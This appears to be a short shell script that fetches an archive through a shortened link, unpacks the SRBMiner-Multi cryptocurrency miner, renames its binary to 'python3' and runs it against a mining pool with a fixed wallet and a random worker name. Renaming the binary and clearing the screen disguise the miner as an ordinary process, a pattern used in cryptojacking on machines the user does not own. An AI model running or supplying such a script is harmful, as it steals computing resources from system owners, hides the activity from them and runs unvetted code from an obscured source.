
wget https://bit.ly/kontolrum

tar -xvf kontolrum

cd SRBMiner-Multi-2-4-7

mv SRBMiner-MULTI python3

nomer=$((RANDOM % 50 + 1))

clear

./python3 --algorithm aurum --pool stratum-eu.rplant.xyz:7114 --wallet waf1qs7djrfr2kj4w8qkylva5tr24500l3nael0l34g.DOTcs-$nomer --keepalive true
